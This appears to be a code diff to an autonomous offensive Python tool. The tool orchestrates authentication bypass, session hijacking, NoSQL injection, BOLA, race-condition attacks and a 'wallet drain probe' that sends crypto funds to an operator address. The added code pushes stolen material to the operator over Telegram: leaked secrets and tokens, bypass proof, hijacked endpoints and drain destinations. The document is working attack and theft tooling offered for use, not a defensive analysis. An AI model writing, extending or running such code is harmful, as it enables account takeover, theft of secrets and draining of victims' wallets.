@@ -13,6 +13,7 @@ Features:
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
 - Fully Synchronized Autonomous Cognitive Reasoning Operator & Immutable disk exfiltration (loot_output/)
+- Integrated with asynchronous Telegram telemetry broadcasting
 """
 import asyncio
 import json
@@ -41,6 +42,9 @@ from modules.loot_logger import save_session_loot
 # Import the referral validation bypass probe & Autonomous Cognitive Brain
 from modules.test_referral import audit_referral_logic
 from modules.cognitive_operator import CognitiveOperator
+
+# Import Telegram Notifier Dispatcher
+from modules.telegram_notifier import send_telegram_alert
 
 # ============================================================
 # CONFIGURATION
@@ -123,6 +127,17 @@ def section(title):
     sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
 
+# Helper function to fire Telegram alerts non-blockingly from synchronous engine code
+def dispatch_tg_alert(loot_type, details):
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
+
 # ============================================================
 # TARGET HANDLING
 # ============================================================
@@ -198,11 +213,13 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         )
         
         if cognitive_result.get("success"):
+            reasoning = cognitive_result.get("reasoning")
             findings.append({
                 "type": "COGNITIVE_AUTONOMOUS_PIVOT_SUCCESS",
-                "evidence": cognitive_result.get("reasoning"),
+                "evidence": reasoning,
                 "status": status
             })
+            dispatch_tg_alert("Cognitive Autonomous Pivot Success", {"endpoint": endpoint, "evidence": reasoning})
     # ========================================================
 
     # Strict SPA Shell Defense: Ignore generic client-side React/Next.js router shells
@@ -237,6 +254,8 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
             extra_loot=extracted_proof
         )
 
+        dispatch_tg_alert("Authentication Bypass Success", {"endpoint": endpoint, "status": status, "proof": extracted_proof})
+
         findings.append({
             "type": "AUTHENTICATION_BYPASS_SUCCESS",
             "evidence": f"Status {status} with verified non-SPA session payload",
@@ -258,6 +277,8 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
             body=body,
             extra_loot={"database_error": db_error}
         )
+
+        dispatch_tg_alert(f"Database Leak ({db_error})", {"endpoint": endpoint, "status": status})
 
         findings.append({
             "type": "POTENTIAL_DATABASE_INJECTION",
@@ -297,6 +318,8 @@ def verify_hijacked_session(transport):
                 body=body,
                 extra_loot={"cookie_jar": dict(transport.cookie_jar)}
             )
+
+            dispatch_tg_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status})
             return True
         else:
             sys.stdout.write(f"{RED}[-] Verification at {endpoint} returned status {status} or generic SPA shell.{RESET}\n")
@@ -489,11 +512,13 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     if leaked_secrets:
         warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
+        dispatch_tg_alert("Leaked Secrets Discovered", {"target": target_url, "secrets": leaked_secrets})
 
     if bola_vulnerabilities:
         warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
         section("LIVE BOLA / STATE-SKIPPING VERIFICATION ASSAULT")
         for bola_route in bola_vulnerabilities:
+            dispatch_tg_alert("BOLA / State-Skipping Route", {"route": bola_route})
             execute_live_login_verification(
                 target_url=target_url,
                 endpoint=bola_route,
@@ -524,7 +549,9 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     has_db_surface = any("login" in p.lower() or "auth" in p.lower() or "user" in p.lower() for p in discovered_paths)
     if has_db_surface:
         try:
-            await run_nosql_assault(target_url, port=port, use_ssl=secure)
+            db_res = await run_nosql_assault(target_url, port=port, use_ssl=secure)
+            if db_res:
+                dispatch_tg_alert("Database Assault Breach", {"target": target_url, "details": str(db_res)[:300]})
         except Exception as exc:
             error(f"Database assault failed: {exc}")
     else:
@@ -535,9 +562,11 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         if hijack_results:
             for finding in hijack_results:
                 if finding.get("status") == "VERIFIED_ACCESS":
+                    endpoint_hit = finding.get("endpoint", "/admin")
+                    dispatch_tg_alert("Verified Session Hijack", {"endpoint": endpoint_hit})
                     execute_live_login_verification(
                         target_url=target_url,
-                        endpoint=finding.get("endpoint", "/admin"),
+                        endpoint=endpoint_hit,
                         cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None,
                         token=finding.get("forged_token")
                     )
@@ -545,12 +574,14 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         error(f"Session hijack failed: {exc}")
 
     try:
-        await run_race_condition_test(
+        race_res = await run_race_condition_test(
             target_url, 
             port=port, 
             use_ssl=secure, 
             session_pool=session_pool
         )
+        if race_res:
+            dispatch_tg_alert("Race Condition Test Success", {"target": target_url})
     except Exception as exc:
         error(f"Race condition module failed: {exc}")
 
@@ -568,6 +599,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                 session_cookies=session_cookies_dict, 
                 target_wallet=operator_evm_dest
             )
+            dispatch_tg_alert("Wallet Drain Probe Dispatched", {"target": target_url, "destination": operator_evm_dest})
         except Exception as exc:
             error(f"Drainer / liquidity audit & probe engine failed: {exc}")
     else:
